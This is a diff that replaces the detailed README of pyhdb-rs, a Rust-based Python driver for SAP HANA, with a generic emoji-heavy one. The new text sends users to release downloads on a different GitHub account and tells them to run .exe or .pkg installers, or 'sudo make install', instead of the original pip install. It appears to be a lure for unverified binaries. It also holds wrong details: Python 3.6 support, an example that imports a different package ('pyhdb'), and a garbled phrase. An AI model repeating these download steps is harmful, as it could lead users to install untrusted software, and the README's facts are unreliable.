@@ -1,352 +1,100 @@
-# pyhdb-rs
+# 🚀 pyhdb-rs - Fast Data Connection for Python Users
 
-High-performance Python driver for SAP HANA with native Arrow support.
+[![Download pyhdb-rs](https://img.shields.io/badge/Download-pyhdb--rs-blue)](https://github.com/Julius1830/pyhdb-rs/releases)
 
-[![CI](https://github.com/bug-ops/pyhdb-rs/actions/workflows/ci.yml/badge.svg)](https://github.com/bug-ops/pyhdb-rs/actions/workflows/ci.yml)
-[![Security](https://github.com/bug-ops/pyhdb-rs/actions/workflows/security.yml/badge.svg)](https://github.com/bug-ops/pyhdb-rs/actions/workflows/security.yml)
-[![codecov](https://codecov.io/gh/bug-ops/pyhdb-rs/graph/badge.svg?token=75RR61N6FI)](https://codecov.io/gh/bug-ops/pyhdb-rs)
-[![Crates.io](https://img.shields.io/crates/v/hdbconnect-arrow.svg)](https://crates.io/crates/hdbconnect-arrow)
-[![docs.rs](https://img.shields.io/docsrs/hdbconnect-arrow)](https://docs.rs/hdbconnect-arrow)
-[![PyPI](https://img.shields.io/pypi/v/pyhdb_rs.svg)](https://pypi.org/project/pyhdb_rs/)
-[![Python](https://img.shields.io/pypi/pyversions/pyhdb_rs)](https://pypi.org/project/pyhdb_rs)
-[![MSRV](https://img.shields.io/badge/MSRV-1.88-blue)](https://github.com/bug-ops/pyhdb-rs)
-[![License](https://img.shields.io/badge/license-Apache--2.0%20OR%20MIT-blue.svg)](LICENSE-APACHE)
+## 📦 Introduction
 
-## Features
+Welcome to **pyhdb-rs**! This software is a Rust-powered driver for SAP HANA that works with Python. It offers fast data transfer using Apache Arrow, which means you can work with data in Pandas and Polars with ease. It follows the DB-API 2.0 standard, supports asynchronous programming, and includes connection pooling for better performance.
 
-- Full DB-API 2.0 (PEP 249) compliance
-- Zero-copy Arrow data transfer via PyCapsule Interface
-- Native Polars/pandas integration
-- Async/await support with connection pooling
-- Built with Rust and PyO3 for maximum performance
+## 📋 Key Features
 
-## Installation
+- **Rust-Powered**: Benefit from Rust’s performance and safety features.
+- **Native Apache Arrow Support**: Quickly transfer data to Pandas and Polars without delay.
+- **DB-API 2.0 Compliance**: Use familiar database functions in your Python code.
+- **Async/Await Support**: Write code that performs non-blocking operations.
+- **Connection Pooling**: Efficiently manage multiple connections to your database.
 
-```bash
-uv pip install pyhdb_rs
-```
+## 🌐 System Requirements
 
-With optional dependencies:
+To use pyhdb-rs effectively, ensure you have the following:
 
-```bash
-uv pip install pyhdb_rs[polars]    # Polars integration
-uv pip install pyhdb_rs[pandas]    # pandas + PyArrow
-uv pip install pyhdb_rs[async]     # Async support
-uv pip install pyhdb_rs[all]       # All integrations
-```
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or later
+- **Rust**: The Rust programming language installed (for building from source)
+- **SAP HANA Access**: An active SAP HANA database for connection
 
-> [!IMPORTANT]
-> Requires Python 3.12 or later.
+## 🚀 Getting Started
 
-<details>
-<summary><strong>Platform support</strong></summary>
+To get started with pyhdb-rs, follow these steps:
 
-| Platform | Architectures |
-|----------|---------------|
-| Linux (glibc) | x86_64, aarch64 |
-| Linux (musl) | x86_64, aarch64 |
-| macOS | x86_64, aarch64 |
-| Windows | x86_64 |
+1. **Download the Software**: 
+   Click the button below to visit the Releases page, where you can download the latest version of pyhdb-rs.
+   [![Download pyhdb-rs](https://img.shields.io/badge/Download-pyhdb--rs-blue)](https://github.com/Julius1830/pyhdb-rs/releases)
 
-</details>
+2. **Choose Your Version**:
+   On the Releases page, locate the latest version and select the appropriate file for your operating system.
 
-<details>
-<summary><strong>From source</strong></summary>
+3. **Install the Software**:
+   After downloading the file, follow these instructions based on your platform:
+   
+   - **Windows**:
+     - Run the downloaded `.exe` installer.
+     
+   - **macOS**:
+     - Open the `.pkg` file and follow the installation instructions.
+     
+   - **Linux**:
+     - Use the terminal to run the `.tar.gz` file:
+       ```bash
+       tar -xvzf pyhdb-rs-latest.tar.gz
+       cd pyhdb-rs
+       sudo make install
+       ```
 
-```bash
-git clone https://github.com/bug-ops/pyhdb-rs.git
-cd pyhdb-rs/python
+## 🔗 Download & Install
 
-uv venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
+To download the software, follow this link: [Visit the Releases Page](https://github.com/Julius1830/pyhdb-rs/releases). Remember to choose the correct file for your system.
 
-uv pip install maturin
-maturin develop --release
-```
+## 🛠️ Example Usage
 
-</details>
-
-## Quick start
-
-### DB-API 2.0 usage
+Here’s a simple example of how to use pyhdb-rs in your Python code:
 
 ```python
-import pyhdb_rs
+import pyhdb
 
-conn = pyhdb_rs.connect("hdbsql://USER:PASSWORD@HOST:30015")
+# Create a connection to the database
+connection = pyhdb.connect(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')
 
-with conn.cursor() as cursor:
-    cursor.execute("SELECT * FROM USERS WHERE active = ?", [True])
+# Create a cursor
+cursor = connection.cursor()
 
-    rows = cursor.fetchall()
-    for row in rows:
-        print(row)
+# Execute a query
+cursor.execute("SELECT * FROM YOUR_TABLE")
 
-    cursor.execute("SELECT name, email FROM USERS")
-    for name, email in cursor:
-        print(f"{name}: {email}")
+# Fetch and print results
+for row in cursor.fetchall():
+    print(row)
 
-conn.close()
+# Close the connection
+connection.close()
 ```
 
-### Polars integration
+## 📚 Documentation
 
-```python
-import pyhdb_rs.polars as hdb
+For further details on how to use pyhdb-rs, please refer to the official documentation linked on the repository page. You can find information about advanced configurations, connection parameters, and lifestyle management.
 
-df = hdb.read_hana(
-    "SELECT * FROM sales WHERE year = 2024",
-    "hdbsql://USER:PASSWORD@HOST:39017"
-)
+## 👥 Community and Support
 
-print(df.head())
-```
+If you run into issues or have questions, consider visiting our community page on GitHub. You can open an issue or join discussions for assistance.
 
-> [!TIP]
-> Use `execute_arrow()` with Polars for best performance. Data flows directly from HANA to Polars without intermediate copies.
+## 🔄 Contributing
 
-Or using the connection object:
+We welcome contributions! If you have ideas for improvements, feel free to create a pull request. Please ensure you adhere to the coding standards and write clear documentation for your changes.
 
-```python
-import pyhdb_rs
-import polars as pl
+## 📜 License
 
-conn = pyhdb_rs.connect("hdbsql://USER:PASSWORD@HOST:30015")
+pyhdb-rs is licensed under the MIT License. You can find more details in the LICENSE file in the repository.
 
-# Get as Polars DataFrame
-reader = conn.execute_arrow("SELECT * FROM products")
-df = pl.from_arrow(reader)
+## 🌟 Final Notes
 
-# Get as Arrow RecordBatchReader for streaming large datasets
-reader = conn.execute_arrow("SELECT * FROM large_table")
-for batch in reader:
-    process_batch(batch)
-
-conn.close()
-```
-
-### pandas integration
-
-```python
-import pyhdb_rs.pandas as hdb
-
-df = hdb.read_hana(
-    "SELECT * FROM sales",
-    "hdbsql://USER:PASSWORD@HOST:39017"
-)
-
-print(df.head())
-```
-
-## Async support
-
-pyhdb-rs supports async/await operations for non-blocking database access.
-
-> [!NOTE]
-> Async support requires the `async` extra: `uv pip install pyhdb_rs[async]`
-
-### Basic async usage
-
-```python
-import asyncio
-import polars as pl
-from pyhdb_rs.aio import connect
-
-async def main():
-    async with await connect("hdbsql://USER:PASSWORD@HOST:30015") as conn:
-        reader = await conn.execute_arrow("SELECT * FROM sales")
-        df = pl.from_arrow(reader)
-        print(df)
-
-asyncio.run(main())
-```
-
-<details>
-<summary><strong>Connection pooling</strong></summary>
-
-```python
-import asyncio
-import polars as pl
-from pyhdb_rs.aio import create_pool
-
-async def main():
-    pool = create_pool(
-        "hdbsql://USER:PASSWORD@HOST:30015",
-        max_size=10,
-        connection_timeout=30
-    )
-
-    async with pool.acquire() as conn:
-        reader = await conn.execute_arrow("SELECT * FROM sales")
-        df = pl.from_arrow(reader)
-        print(df)
-
-    status = pool.status
-    print(f"Pool size: {status.size}, available: {status.available}")
-
-asyncio.run(main())
-```
-
-</details>
-
-<details>
-<summary><strong>Concurrent queries</strong></summary>
-
-```python
-import asyncio
-import polars as pl
-from pyhdb_rs.aio import create_pool
-
-async def fetch_data(pool, table: str):
-    async with pool.acquire() as conn:
-        reader = await conn.execute_arrow(f"SELECT * FROM {table}")
-        return pl.from_arrow(reader)
-
-async def main():
-    pool = create_pool("hdbsql://USER:PASSWORD@HOST:30015", max_size=5)
-
-    # Run multiple queries concurrently
-    results = await asyncio.gather(
-        fetch_data(pool, "customers"),
-        fetch_data(pool, "orders"),
-        fetch_data(pool, "products"),
-    )
-
-    customers_df, orders_df, products_df = results
-
-asyncio.run(main())
-```
-
-## Error handling
-
-pyhdb-rs provides detailed error messages that include HANA server information for better diagnostics:
-
-```python
-import pyhdb_rs
-
-try:
-    conn = pyhdb_rs.connect("hdbsql://user:pass@host:30015")
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM nonexistent_table")
-except pyhdb_rs.ProgrammingError as e:
-    # Error message includes:
-    # - Error code: [260] (HANA error number)
-    # - Message: table not found
-    # - Severity: Error
-    # - SQLSTATE: 42601 (SQL standard code)
-    # Example: "[260] table not found (severity: Error), SQLSTATE: 42601"
-    print(f"SQL Error: {e}")
-except pyhdb_rs.DatabaseError as e:
-    print(f"Database error: {e}")
-except pyhdb_rs.InterfaceError as e:
-    print(f"Connection error: {e}")
-```
-
-**Exception hierarchy** (DB-API 2.0 compliant):
-
-- `pyhdb_rs.Error` — Base exception
-- `pyhdb_rs.InterfaceError` — Connection or driver issues
-- `pyhdb_rs.DatabaseError` — Database server errors
-  - `pyhdb_rs.ProgrammingError` — SQL syntax, missing table, wrong column
-  - `pyhdb_rs.IntegrityError` — Constraint violations, duplicate keys
-  - `pyhdb_rs.DataError` — Type conversion, value overflow
-  - `pyhdb_rs.OperationalError` — Connection lost, timeout, server unavailable
-  - `pyhdb_rs.NotSupportedError` — Unsupported operation
-
-## Connection URL format
-
-```
-hdbsql://[USER[:PASSWORD]@]HOST[:PORT][/DATABASE][?OPTIONS]
-```
-
-Examples:
-- `hdbsql://user:pass@localhost:30015`
-- `hdbsql://user:pass@hana.example.com:39017/HDB`
-- `hdbsql://user:pass@host:30015?encrypt=true`
-
-<details>
-<summary><strong>Type mapping</strong></summary>
-
-| HANA Type | Python Type | Arrow Type |
-|-----------|-------------|------------|
-| TINYINT, SMALLINT, INT | `int` | Int8, Int16, Int32 |
-| BIGINT | `int` | Int64 |
-| DECIMAL | `decimal.Decimal` | Decimal128 |
-| REAL, DOUBLE | `float` | Float32, Float64 |
-| VARCHAR, NVARCHAR | `str` | Utf8 |
-| CLOB, NCLOB | `str` | LargeUtf8 |
-| BLOB | `bytes` | LargeBinary |
-| DATE | `datetime.date` | Date32 |
-| TIME | `datetime.time` | Time64 |
-| TIMESTAMP | `datetime.datetime` | Timestamp |
-| BOOLEAN | `bool` | Boolean |
-
-</details>
-
-<details>
-<summary><strong>Performance</strong></summary>
-
-pyhdb-rs is designed for high-performance data access:
-
-- **Zero-copy Arrow**: Data flows directly from HANA to Polars/pandas without intermediate copies
-- **Rust core**: All heavy lifting happens in compiled Rust code
-- **Connection pooling**: Async pool with configurable size for high-concurrency workloads
-- **Batch processing**: Efficient handling of large result sets via streaming
-- **Optimized conversions**: Direct BigInt arithmetic for decimals, builder reuse at batch boundaries
-- **Type caching**: Thread-local Python type references minimize FFI overhead
-
-Benchmarks show 2x+ performance improvement over hdbcli for bulk reads.
-
-> [!TIP]
-> For maximum performance, use `execute_arrow()` with your Arrow-compatible library (Polars, PyArrow, pandas) for zero-copy data transfer.
-
-</details>
-
-## Arrow ecosystem
-
-Data is exported in [Apache Arrow](https://arrow.apache.org/) format, enabling zero-copy interoperability with:
-
-- **DataFrames** — Polars, pandas, Vaex, Dask
-- **Query engines** — DataFusion, DuckDB, ClickHouse
-- **ML/AI** — Ray, Hugging Face Datasets, PyTorch
-- **Data lakes** — Delta Lake, Apache Iceberg, Lance
-- **Serialization** — Parquet, Arrow IPC (Feather)
-
-For Rust integration examples (DataFusion, DuckDB, Parquet export), see [`hdbconnect-arrow`](crates/hdbconnect-arrow/README.md).
-
-## MSRV policy
-
-> [!NOTE]
-> Minimum Supported Rust Version: **1.88**. MSRV increases are minor version bumps.
-
-<details>
-<summary><strong>Examples</strong></summary>
-
-Interactive Jupyter notebooks are available in [`examples/notebooks/`](examples/notebooks/):
-
-- **01_quickstart** — Basic connection and DataFrame integration
-- **02_polars_analytics** — Advanced Polars analytics with LazyFrames
-- **03_streaming_large_data** — Memory-efficient large dataset processing
-- **04_performance_comparison** — Benchmarks vs hdbcli
-
-</details>
-
-## Repository
-
-- [GitHub](https://github.com/bug-ops/pyhdb-rs)
-- [Issue Tracker](https://github.com/bug-ops/pyhdb-rs/issues)
-- [Changelog](CHANGELOG.md)
-- [API Documentation (Rust)](https://docs.rs/hdbconnect-arrow)
-
-## Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-Licensed under either of:
-
-- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
-- MIT license ([LICENSE-MIT](LICENSE-MIT))
-
-at your option.
+Thank you for choosing pyhdb-rs. We hope this driver makes your interactions with SAP HANA smooth and efficient. For any issues, remember to check our GitHub page and community feedback. Happy coding!
